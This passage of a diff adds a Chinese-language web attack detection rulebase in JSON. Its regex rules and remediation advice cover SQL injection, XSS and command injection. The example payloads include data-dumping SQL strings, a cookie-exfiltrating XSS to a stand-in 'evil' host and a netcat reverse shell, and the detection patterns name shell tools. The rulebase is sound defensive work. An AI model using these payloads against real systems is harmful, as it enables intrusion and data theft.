@@ -1,0 +1,1981 @@
+{
+  "version": "2025.02",
+  "updated_at": "2025-02-20",
+  "description": "Web 攻击检测知识库：把 HTTP 请求（路径 / 查询串 / 请求体 / 请求头）映射为 Web 攻击大类（对齐 OWASP Top 10），供流量侧实时检测、告警与自动封禁使用。可自行扩展 categories / rules，无需改代码。",
+  "field_help": {
+    "categories": "攻击大类：key 即告警类型后缀（告警类别为 web_<key>），含中文名 / OWASP / CWE / 默认级别",
+    "rules[].patterns": "不区分大小写的正则片段；命中任意一条即视为该规则命中（match_all=false，默认），match_all=true 时要求全部命中",
+    "rules[].match_targets": "匹配字段：path | query | body | header | cookie | user_agent | referer | filename | any",
+    "rules[].match_mode": "normalized（默认，作用于解码归一化后的文本）| raw（作用于原始文本，用于识别 %2e%2e 这类编码特征）",
+    "rules[].threshold": "窗口内累计命中次数达到 count 才告警（暴力破解 / CSRF / 验证码等频次类规则使用）",
+    "rules[].exclude_patterns": "误报抑制：全部匹配字段中任意一处命中即忽略本条规则",
+    "rules[].confidence": "low | medium | high —— 命中可信度，用于排序与自动处置门槛",
+    "rules[].severity": "可选，覆盖所属大类的默认级别",
+    "归一化规则": "匹配前会把目标字段做：多轮 URL 解码（含 %u 形式）→ HTML 实体解码 → SQL 注释（/**/、--、#）转空格 → 连续空白折叠为单空格 → 转小写；因此词间可用单空格假设"
+  },
+  "categories": [
+    {
+      "key": "sql_injection",
+      "name": "SQL 注入",
+      "name_en": "SQL Injection",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-89",
+      "severity": "critical",
+      "description": "攻击者在参数中拼接 SQL 语句，绕过查询条件或直接读取/篡改数据库。"
+    },
+    {
+      "key": "sql_injection_blind",
+      "name": "SQL 盲注",
+      "name_en": "Blind SQL Injection",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-89",
+      "severity": "critical",
+      "description": "页面不回显数据，攻击者用布尔/时间/报错差异逐字符推断数据库内容。"
+    },
+    {
+      "key": "xss_reflected",
+      "name": "反射型 XSS",
+      "name_en": "Reflected XSS",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-79",
+      "severity": "high",
+      "description": "脚本随请求参数原样回显到页面，诱导受害者点击即可在其浏览器执行。"
+    },
+    {
+      "key": "xss_stored",
+      "name": "存储型 XSS",
+      "name_en": "Stored XSS",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-79",
+      "severity": "high",
+      "description": "恶意脚本被持久化保存（留言/昵称/资料），所有查看该页面的用户都会中招。"
+    },
+    {
+      "key": "command_injection",
+      "name": "命令注入",
+      "name_en": "Command Injection",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-78",
+      "severity": "critical",
+      "description": "参数被拼进系统命令执行，可直接获取服务器 Shell。"
+    },
+    {
+      "key": "file_inclusion",
+      "name": "文件包含",
+      "name_en": "File Inclusion (LFI/RFI)",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-98",
+      "severity": "critical",
+      "description": "包含参数未做白名单，可读取本地敏感文件（LFI）或加载远程恶意脚本（RFI）。"
+    },
+    {
+      "key": "file_upload",
+      "name": "恶意文件上传",
+      "name_en": "Unrestricted File Upload",
+      "owasp": "A04:2021 Insecure Design",
+      "cwe": "CWE-434",
+      "severity": "critical",
+      "description": "上传校验缺失或可绕过，攻击者上传 Webshell 获得服务器控制权。"
+    },
+    {
+      "key": "brute_force",
+      "name": "暴力破解",
+      "name_en": "Brute Force / Credential Stuffing",
+      "owasp": "A07:2021 Identification and Authentication Failures",
+      "cwe": "CWE-307",
+      "severity": "high",
+      "description": "对登录/接口高频尝试口令或验证码，成功即接管账号。"
+    },
+    {
+      "key": "csrf",
+      "name": "跨站请求伪造",
+      "name_en": "Cross-Site Request Forgery",
+      "owasp": "A01:2021 Broken Access Control",
+      "cwe": "CWE-352",
+      "severity": "high",
+      "description": "敏感操作缺少 Token/来源校验，攻击者可借受害者身份完成改密、转账等操作。"
+    },
+    {
+      "key": "insecure_captcha",
+      "name": "不安全的验证码",
+      "name_en": "Insecure CAPTCHA",
+      "owasp": "A07:2021 Identification and Authentication Failures",
+      "cwe": "CWE-804",
+      "severity": "medium",
+      "description": "验证码可空/固定/复用，或校验流程可跳步，等同于没有验证码。"
+    },
+    {
+      "key": "path_traversal",
+      "name": "目录穿越",
+      "name_en": "Path Traversal",
+      "owasp": "A01:2021 Broken Access Control",
+      "cwe": "CWE-22",
+      "severity": "high",
+      "description": "用 ../ 跳出 Web 根目录读取任意文件。"
+    },
+    {
+      "key": "ssrf",
+      "name": "服务端请求伪造",
+      "name_en": "Server-Side Request Forgery",
+      "owasp": "A10:2021 Server-Side Request Forgery",
+      "cwe": "CWE-918",
+      "severity": "high",
+      "description": "服务端代为访问内网或云元数据地址，可探测内网、读取凭据。"
+    },
+    {
+      "key": "xxe",
+      "name": "XML 外部实体注入",
+      "name_en": "XML External Entity",
+      "owasp": "A05:2021 Security Misconfiguration",
+      "cwe": "CWE-611",
+      "severity": "high",
+      "description": "XML 解析开启外部实体，可读文件、发起 SSRF 或造成拒绝服务。"
+    },
+    {
+      "key": "webshell",
+      "name": "Webshell 访问",
+      "name_en": "Webshell",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-506",
+      "severity": "critical",
+      "description": "请求已上传的木马脚本或直接通过参数执行命令，通常意味着主机已被控制。"
+    },
+    {
+      "key": "ssti",
+      "name": "服务端模板注入",
+      "name_en": "Server-Side Template Injection",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-1336",
+      "severity": "critical",
+      "description": "模板引擎把用户输入当模板渲染，可直接执行任意代码。"
+    },
+    {
+      "key": "ldap_nosql_injection",
+      "name": "LDAP/NoSQL 注入",
+      "name_en": "LDAP & NoSQL Injection",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-90",
+      "severity": "high",
+      "description": "查询条件被构造为永真表达式（*)(|(& 或 $ne/$where），绕过认证或拖库。"
+    },
+    {
+      "key": "crlf_injection",
+      "name": "CRLF 注入",
+      "name_en": "CRLF / HTTP Response Splitting",
+      "owasp": "A03:2021 Injection",
+      "cwe": "CWE-93",
+      "severity": "medium",
+      "description": "在参数中注入 %0d%0a 篡改响应头，可写入假 Cookie 或拆分响应。"
+    }
+  ],
+  "rules": [
+    {
+      "id": "WEB-SQLI-001",
+      "category": "sql_injection",
+      "title": "SQL 注入：联合查询（UNION SELECT）",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header",
+        "cookie"
+      ],
+      "patterns": [
+        "union\\s+(all\\s+)?select",
+        "1\\s*=\\s*1\\s+union",
+        "union\\s+select\\s+[\\d,\\s]+",
+        "'\\s*union\\s+select"
+      ],
+      "remediation": "数据库访问全部改为参数化查询/预编译语句；对 id 等字段做类型与白名单校验；数据库账号最小权限。",
+      "references": [
+        "https://owasp.org/Top10/A03_2021-Injection/",
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' union select user,password from users-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLI-002",
+      "category": "sql_injection",
+      "title": "SQL 注入：永真条件绕过（OR 1=1）",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header",
+        "cookie"
+      ],
+      "patterns": [
+        "'\\s*or\\s*'?\\d+'?\\s*=\\s*'?\\d+",
+        "'\\s*or\\s+'[^']*'\\s*=\\s*'",
+        "\\bor\\s+\\d+\\s*=\\s*\\d+\\s*(--|#|;)",
+        "\\band\\s+\\d+\\s*=\\s*\\d+\\s*(--|#|;)",
+        "\"\\s*or\\s*\"?\\d+\"?\\s*=\\s*\"?\\d+"
+      ],
+      "remediation": "使用参数化查询；登录/查询接口增加失败次数限制与验证码；对参数做强类型校验。",
+      "false_positive_hint": "搜索框里的自然语言（如“or 1 = 1”）可能误报，建议结合响应状态码复核。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' OR '1'='1",
+        "?id=1 or 1=1 -- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLI-003",
+      "category": "sql_injection",
+      "title": "SQL 注入：元数据探测（information_schema）",
+      "severity": "high",
+      "cvss": 8.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header",
+        "cookie"
+      ],
+      "patterns": [
+        "information_schema",
+        "sysobjects|syscolumns|all_tables|user_tables|dba_users",
+        "mysql\\.user|pg_shadow"
+      ],
+      "remediation": "修复注入点；数据库账号禁止访问元数据与系统表；开启 SQL 审计日志。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' union select table_name,2 from information_schema.tables-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLI-004",
+      "category": "sql_injection",
+      "title": "SQL 注入：报错注入函数",
+      "severity": "critical",
+      "cvss": 9.1,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header",
+        "cookie"
+      ],
+      "patterns": [
+        "(extractvalue|updatexml)\\s*\\(",
+        "(exp|geometrycollection|polygon|multipoint)\\s*\\(\\s*\\(",
+        "convert\\s*\\(\\s*int\\s*,",
+        "extractvalue\\s*\\(\\s*1\\s*,"
+      ],
+      "remediation": "关闭生产环境数据库错误回显；统一异常页面；修复注入点。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' and extractvalue(1,concat(0x7e,version()))-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLI-005",
+      "category": "sql_injection",
+      "title": "SQL 注入：堆叠查询与危险语句",
+      "severity": "critical",
+      "cvss": 9.9,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header",
+        "cookie"
+      ],
+      "patterns": [
+        ";\\s*(drop|truncate|alter)\\s+(table|database|user)",
+        ";\\s*delete\\s+from\\s+",
+        ";\\s*update\\s+\\w+\\s+set\\s+",
+        "into\\s+(out|dump)file",
+        "load_file\\s*\\(",
+        "xp_cmdshell|sp_configure|openrowset"
+      ],
+      "remediation": "禁止多语句执行；数据库账号去掉 FILE 权限与 xp_cmdshell；立即封禁来源并核对数据完整性。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1'; drop table users-- -",
+        "?id=1 union select 1,load_file('/etc/passwd')"
+      ]
+    },
+    {
+      "id": "WEB-SQLI-006",
+      "category": "sql_injection",
+      "title": "SQL 注入：闭合与注释特征（探测型）",
+      "severity": "high",
+      "cvss": 8.2,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "'\\s*(--|#)\\s*$",
+        "'\\s*;\\s*--",
+        "\\)\\s*--\\s*$",
+        "\\d\\s+(order\\s+by|group\\s+by)\\s+\\d+",
+        "'\\s*union\\s*$"
+      ],
+      "remediation": "对参数做类型转换与转义；拦截含 SQL 注释/闭合特征的请求；排序字段改为白名单映射。",
+      "false_positive_hint": "可信度中等：若业务真的用 order by 拼接排序参数，请改为白名单避免误报。",
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection"
+      ],
+      "examples": [
+        "?id=1' -- -",
+        "?sort=1 order by 5"
+      ]
+    },
+    {
+      "id": "WEB-SQLB-001",
+      "category": "sql_injection_blind",
+      "title": "SQL 盲注：时间型（SLEEP/WAITFOR）",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "(sleep|benchmark|pg_sleep)\\s*\\(\\s*\\d",
+        "waitfor\\s+delay\\s+'",
+        "sleep\\s*\\(\\s*\\(?\\s*select",
+        "if\\s*\\([^)]{0,40},\\s*sleep\\s*\\("
+      ],
+      "remediation": "修复注入点并限制单请求最大执行时间；数据库层禁止 sleep/benchmark；对异常耗时请求做熔断。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+      ],
+      "examples": [
+        "?id=1' AND SLEEP(5)-- -",
+        "?id=1'); WAITFOR DELAY '0:0:5'-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLB-002",
+      "category": "sql_injection_blind",
+      "title": "SQL 盲注：布尔型（SUBSTRING/ASCII 推断）",
+      "severity": "critical",
+      "cvss": 9.1,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "\\b(substring|substr|mid|left|right)\\s*\\(\\s*\\(",
+        "\\bascii\\s*\\(\\s*(substring|substr|select)",
+        "\\blength\\s*\\(\\s*(database|user|password)\\s*\\(?",
+        "'\\s*and\\s+\\(?select\\s+(ascii|length|substring)",
+        "'\\s*and\\s+ord\\s*\\(",
+        "'\\s*and\\s+1\\s*=\\s*\\(?select"
+      ],
+      "remediation": "统一参数化查询；对布尔差异响应做统一化处理；限制异常请求频次。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' AND ASCII(SUBSTRING(database(),1,1))=100-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLB-003",
+      "category": "sql_injection_blind",
+      "title": "SQL 盲注：CASE WHEN / IIF 条件推断",
+      "severity": "high",
+      "cvss": 8.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "case\\s+when\\s+[^)]{0,60}\\s+then\\s+",
+        "iif\\s*\\(\\s*[^)]{0,40},\\s*1\\s*,\\s*0\\s*\\)",
+        "'\\s*(and|or)\\s+\\(\\s*select\\s+case",
+        "case\\s+when\\s+exists\\s*\\("
+      ],
+      "remediation": "修复注入点；对 SQL 关键字组合（case when/exists）做请求侧拦截；数据库最小权限。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+      ],
+      "examples": [
+        "?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLB-004",
+      "category": "sql_injection_blind",
+      "title": "SQL 盲注：布尔真假对比探测（永真/永假 + 注释）",
+      "severity": "high",
+      "cvss": 8.5,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "'\\s*and\\s+'?\\d+'?\\s*=\\s*'?\\d+'?\\s*(--|#)",
+        "'\\s*or\\s+'?\\d+'?\\s*=\\s*'?\\d+'?\\s*(--|#)",
+        "'\\s*and\\s+'?[a-z]+'?\\s*=\\s*'?[a-z]+'?\\s*(--|#)",
+        "'\\s*and\\s+\\d+\\s*!=\\s*\\d+\\s*(--|#)"
+      ],
+      "remediation": "统一参数化查询并统一错误/空结果响应，消除布尔差异；对高频相似请求做限速。",
+      "false_positive_hint": "可信度中等：正常业务里罕见“' AND 1=1--”结构，但仍建议结合来源画像确认。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+      ],
+      "examples": [
+        "?id=1' AND 1=2-- -"
+      ]
+    },
+    {
+      "id": "WEB-SQLB-005",
+      "category": "sql_injection_blind",
+      "title": "SQL 盲注：带外/OOB 与文件读取探测",
+      "severity": "critical",
+      "cvss": 9.4,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "cookie"
+      ],
+      "patterns": [
+        "load_file\\s*\\(\\s*(char|0x|')",
+        "utl_http\\.request|utl_inaddr\\.get_host_address",
+        "copy\\s+[\\w\\.]+\\s+to\\s+program",
+        "xp_dirtree|xp_fileexist|xp_subdirs",
+        "dnslog|ceye\\.io|burpcollaborator|\\.oast\\."
+      ],
+      "remediation": "数据库账号去掉 FILE/库外访问权限；封禁数据库出网；立即排查数据外泄与落地文件。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/89.html"
+      ],
+      "examples": [
+        "?id=1' union select 1,load_file('\\\\\\\\attacker\\\\share')-- -"
+      ]
+    },
+    {
+      "id": "WEB-XSSR-001",
+      "category": "xss_reflected",
+      "title": "反射型 XSS：script 标签注入",
+      "severity": "high",
+      "cvss": 8.3,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "<\\s*script[^>]*>",
+        "<\\s*/\\s*script\\s*>",
+        "<\\s*script\\s+src\\s*=",
+        "<\\s*script\\s*>[\\s\\S]{0,200}(alert|prompt|confirm|eval|document\\.cookie)"
+      ],
+      "remediation": "输出侧统一上下文转义（HTML/属性/JS/URL）；输入侧白名单过滤；部署 CSP（script-src 'self'）作为纵深防御。",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://cwe.mitre.org/data/definitions/79.html"
+      ],
+      "examples": [
+        "?name=<script>alert(document.cookie)</script>"
+      ]
+    },
+    {
+      "id": "WEB-XSSR-002",
+      "category": "xss_reflected",
+      "title": "反射型 XSS：事件处理器（onerror/onload 等）",
+      "severity": "high",
+      "cvss": 8.1,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "on(error|load|click|mouseover|mouseenter|focus|blur|submit|change|animationstart|toggle|start)\\s*=",
+        "<\\s*(img|svg|iframe|body|input|details|marquee|video|audio|object|embed|form)[^>]{0,60}\\s+on\\w+\\s*=",
+        "<\\s*svg[^>]{0,40}/onload",
+        "onerror\\s*=\\s*(alert|eval|prompt|confirm|window|document)"
+      ],
+      "remediation": "对所有 HTML 属性做转义与白名单（禁止由用户输入决定 on* 事件属性）；输出编码 + CSP。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/79.html"
+      ],
+      "examples": [
+        "?name=<img src=x onerror=alert(1)>",
+        "?name=<svg/onload=alert(1)>"
+      ]
+    },
+    {
+      "id": "WEB-XSSR-003",
+      "category": "xss_reflected",
+      "title": "反射型 XSS：伪协议与危险 URL（javascript:/data:）",
+      "severity": "high",
+      "cvss": 8,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "javascript\\s*:\\s*(alert|eval|document|window|void|confirm|prompt)",
+        "=\\s*[\"']?javascript\\s*:",
+        "data\\s*:\\s*text/html",
+        "vbscript\\s*:\\s*msgbox",
+        "srcdoc\\s*=\\s*[\"']"
+      ],
+      "remediation": "对跳转/链接类参数仅允许 http(s) 与站内相对路径；输出转义并禁止 srcdoc。",
+      "false_positive_hint": "可信度中等：若站内确实提供 javascript: 书签链接，请按路径加白。",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/"
+      ],
+      "examples": [
+        "?url=javascript:alert(document.cookie)"
+      ]
+    },
+    {
+      "id": "WEB-XSSR-004",
+      "category": "xss_reflected",
+      "title": "反射型 XSS：常用弹窗/执行函数探测",
+      "severity": "medium",
+      "cvss": 6.1,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(alert|prompt|confirm)\\s*\\(\\s*[\\d'\"`]",
+        "(document\\.cookie|document\\.domain|document\\.write)\\s*[;(]",
+        "window\\.location\\s*=\\s*[\"']?javascript",
+        "(eval|setTimeout|setInterval)\\s*\\(\\s*[\"']"
+      ],
+      "remediation": "输出转义 + CSP；对含 alert/document.cookie 等特征的请求做拦截与人工复核。",
+      "false_positive_hint": "可信度中等：前端调试参数可能误报，建议结合来源 IP 画像判断。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/79.html"
+      ],
+      "examples": [
+        "?q=<script>alert('xss')</script>"
+      ]
+    },
+    {
+      "id": "WEB-XSSR-005",
+      "category": "xss_reflected",
+      "title": "反射型 XSS：畸形标签绕过（大小写/注释/实体编码）",
+      "severity": "high",
+      "cvss": 7.8,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "<\\s*(script|img|svg|iframe|object|embed|details|body|marquee)\\b",
+        "<\\s*[a-z]+\\s+[a-z]+\\s*=\\s*[\"']?[^>]{0,40}on\\w+\\s*=",
+        "&lt;\\s*script[^&]{0,40}&gt;"
+      ],
+      "remediation": "统一输出编码并拦截未转义标签；开启 CSP 与 HttpOnly Cookie 降低危害。",
+      "false_positive_hint": "可信度中等：富文本/邮件正文参数可能触发，建议对白名单参数放行。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/79.html"
+      ],
+      "examples": [
+        "?name=<IMG SRC=# onerror=alert(1)>"
+      ]
+    },
+    {
+      "id": "WEB-XSSS-001",
+      "category": "xss_stored",
+      "title": "存储型 XSS：留言/昵称等持久化字段写入脚本",
+      "severity": "high",
+      "cvss": 8.8,
+      "confidence": "high",
+      "match_targets": [
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "(txtname|mtxmessage|message|comment|content|guestbook|nickname|signature|profile|note|feedback)[^&]{0,120}(<\\s*script|<\\s*img[^>]*onerror|on\\w+\\s*=\\s*(alert|eval))",
+        "<\\s*script[^>]{0,80}>[\\s\\S]{0,200}<\\s*/\\s*script\\s*>",
+        "<\\s*iframe[^>]{0,120}>",
+        "<\\s*body[^>]{0,60}onload\\s*="
+      ],
+      "remediation": "出库时上下文转义（不能只做入库过滤）；富文本使用白名单净化库（DOMPurify 等）；Cookie 加 HttpOnly。",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/"
+      ],
+      "examples": [
+        "name=test&mtxMessage=<script>alert('stored')</script>"
+      ]
+    },
+    {
+      "id": "WEB-XSSS-002",
+      "category": "xss_stored",
+      "title": "存储型 XSS：外链恶意脚本与样式注入",
+      "severity": "high",
+      "cvss": 8.5,
+      "confidence": "high",
+      "match_targets": [
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "<\\s*script[^>]{0,80}src\\s*=\\s*[\"']?https?://",
+        "<\\s*link[^>]{0,80}rel\\s*=\\s*[\"']?stylesheet",
+        "style\\s*=\\s*[\"'][^\"']{0,80}expression\\s*\\(",
+        "<\\s*meta[^>]{0,80}http-equiv\\s*=\\s*[\"']?refresh",
+        "<\\s*object[^>]{0,80}(data|type)\\s*="
+      ],
+      "remediation": "禁止用户内容引入外部资源；富文本白名单只允许安全标签/属性；对上传的 HTML/SVG 做净化。",
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+      ],
+      "examples": [
+        "comment=<script src=\"https://evil.example/x.js\"></script>"
+      ]
+    },
+    {
+      "id": "WEB-XSSS-003",
+      "category": "xss_stored",
+      "title": "存储型 XSS：SVG/表单/伪协议组合载荷",
+      "severity": "high",
+      "cvss": 8.2,
+      "confidence": "medium",
+      "match_targets": [
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "<\\s*svg[\\s\\S]{0,120}(onload|onerror|script)",
+        "<\\s*form[^>]{0,120}action\\s*=\\s*[\"']?javascript\\s*:",
+        "<\\s*(video|audio|source)[^>]{0,120}on\\w+\\s*=",
+        "javascript\\s*:[^\"'\\s]{0,60}(alert|eval)",
+        "<\\s*input[^>]{0,80}formaction\\s*=\\s*[\"']?javascript"
+      ],
+      "remediation": "对可持久化字段做白名单净化并限制标签/属性集合；前端用 textContent 或框架安全插值渲染。",
+      "false_positive_hint": "可信度中等：SVG 图表上传/编辑器场景可能误报，建议按接口加白。",
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/"
+      ],
+      "examples": [
+        "content=<svg/onload=fetch('//evil/'+document.cookie)>"
+      ]
+    },
+    {
+      "id": "WEB-XSSS-004",
+      "category": "xss_stored",
+      "title": "存储型 XSS：模板/组件中的二次注入",
+      "severity": "high",
+      "cvss": 8,
+      "confidence": "medium",
+      "match_targets": [
+        "body",
+        "query"
+      ],
+      "patterns": [
+        "\\{\\{\\s*(html|unescape|safe|raw)\\s*\\(",
+        "on\\w+\\s*=\\s*[\"']?\\s*(fetch|location|top\\.location)\\s*=",
+        "<\\s*div[^>]{0,80}style\\s*=\\s*[\"'][^\"']{0,60}(url|expression)\\s*\\(",
+        "\\$\\{[^}]{0,60}(alert|document\\.cookie)"
+      ],
+      "remediation": "模板渲染必须区分“内容”与“标记”；前端禁用内联事件与 eval 类渲染；对模板参数做白名单。",
+      "false_positive_hint": "可信度中等：CMS 模板参数本身可能合法，建议对管理后台来源放宽。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/79.html"
+      ],
+      "examples": [
+        "content={{html('<img src=x onerror=alert(1)>')}}"
+      ]
+    },
+    {
+      "id": "WEB-CMDI-001",
+      "category": "command_injection",
+      "title": "命令注入：命令分隔符 + 系统命令",
+      "severity": "critical",
+      "cvss": 9.8,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header"
+      ],
+      "patterns": [
+        "[;|&]{1,2}\\s*(cat|ls|id|whoami|uname|hostname|ifconfig|ipconfig|netstat|ps|env|pwd)\\b",
+        "[;|&]{1,2}\\s*(bash|sh|zsh|cmd|powershell|pwsh|perl|python[23]?|php|nc|ncat|netcat|curl|wget|tftp)\\b",
+        "[;|&]{1,2}\\s*(ping|nslookup|dig|traceroute|telnet)\\s+-?\\w",
+        "\\|\\s*(cat|id|whoami|ls)\\s+/"
+      ],
+      "remediation": "禁止把参数拼接进 shell；改用参数数组调用（如 subprocess 列表形式）+ 白名单校验；容器内最小权限并禁用危险命令。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Command_Injection",
+        "https://cwe.mitre.org/data/definitions/78.html"
+      ],
+      "examples": [
+        "?ip=127.0.0.1; cat /etc/passwd",
+        "?ip=127.0.0.1 | whoami"
+      ]
+    },
+    {
+      "id": "WEB-CMDI-002",
+      "category": "command_injection",
+      "title": "命令注入：命令替换与反引号执行",
+      "severity": "critical",
+      "cvss": 9.6,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header"
+      ],
+      "patterns": [
+        "\\$\\(\\s*[a-z_]{2,20}[^)]{0,60}\\)",
+        "\\$\\{\\s*(ifs|path|shell)[^}]{0,20}\\}",
+        "`\\s*(id|whoami|cat|ls|uname|ifconfig|curl|wget|nc|bash|sh|sleep|ping)\\b[^`]{0,60}`",
+        "\\bexec\\s+\\d+<>"
+      ],
+      "remediation": "禁止动态拼接 shell 命令；对输入做白名单（如仅允许 IP 正则）；关闭不必要的 shell 元字符解析。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/78.html"
+      ],
+      "examples": [
+        "?host=$(cat /etc/passwd)",
+        "?host=`id`"
+      ]
+    },
+    {
+      "id": "WEB-CMDI-003",
+      "category": "command_injection",
+      "title": "命令注入：敏感文件读取与反弹 Shell",
+      "severity": "critical",
+      "cvss": 10,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body",
+        "header"
+      ],
+      "patterns": [
+        "(cat|head|tail|more|less|strings|nl|od|xxd)\\s+(/etc/passwd|/etc/shadow|/proc/self/environ|/proc/self/cmdline|/var/log/|/root/)",
+        "(bash|sh)\\s+-i\\s*(>&|&>|0>&1)",
+        "nc\\s+(-e\\s+)?[\\d\\.]{7,15}\\s+\\d{2,5}",
+        "python[23]?\\s+-c\\s+['\"]import\\s+socket",
+        "/dev/tcp/[\\d\\.]{7,15}/\\d{2,5}",
+        "curl\\s+[^|]{0,60}\\|\\s*(ba)?sh"
+      ],
+      "remediation": "立即封禁来源 IP 并隔离主机取证；加固应用（去拼接、加白名单）；补充主机侧命令审计与告警。",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/78.html"
+      ],
+      "examples": [
+        "?ip=1.1.1.1; nc -e /bin/sh 203.0.113.9 4444",
+        "?ip=1.1.1.1|cat /etc/shadow"
+      ]
+    },
+    {
+      "id": "WEB-CMDI-004",
+      "category": "command_injection",
+      "title": "命令注入：换行/Windows 命令绕过",
+      "severity": "high",
+      "cvss": 8.8,
+      "confidence": "medium",
+      "match_targets": [
+        "query",
+        "body",
+        "header"
+      ],
+      "patterns": [
+        "%0a\\s*(cat|id|whoami|ls|wget|curl|nc|bash|sh)\\b",
+        "\\n\\s*(cat|id|whoami|ls|wget|curl|nc|bash|sh)\\b",
+        "(&&|%26%26)\\s*(type|dir|whoami|ipconfig|systeminfo|net\\s+user)\\b",
+        "\\bcmd(\\.exe)?\\s*/c\\s+",
+        "\\bpowershell(-\\.exe)?\\s+(-enc|-e|-c|iex)\\b"
+      ],
+      "remediation": "对换行符与 & | ; 做统一过滤；接口层只接受严格格式参数；启用 WAF 命令注入规则集。",
+      "false_positive_hint": "可信度中等：日志/文本内容里出现命令样例可能误报，建议按接口加白。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Command_Injection"
+      ],
+      "examples": [
+        "?ip=1.1.1.1%0acat /etc/hosts",
+        "?cmd=&& whoami"
+      ]
+    },
+    {
+      "id": "WEB-LFI-001",
+      "category": "file_inclusion",
+      "title": "文件包含：参数指向本地敏感文件（LFI）",
+      "severity": "critical",
+      "cvss": 9.4,
+      "confidence": "high",
+      "match_targets": [
+        "path",
+        "query",
+        "body"
+      ],
+      "patterns": [
+        "(page|file|include|path|template|view|doc|folder|dir|load|module|conf|inc|content)\\s*=\\s*[^&]{0,40}(\\.\\./|/etc/|/proc/|/var/log/|/root/|c:\\\\|windows\\\\|win\\.ini|boot\\.ini|web\\.config|wp-config)",
+        "/\\.\\./|\\?[\\w-]{1,20}=\\.\\./",
+        "(etc/passwd|etc/shadow|proc/self/environ|windows/win\\.ini|windows/system32/config/sam)"
+      ],
+      "remediation": "包含路径改用白名单映射（ID → 文件）；禁止用户输入直接进入 include/require；设置 open_basedir 与最小读权限。",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal",
+        "https://cwe.mitre.org/data/definitions/98.html"
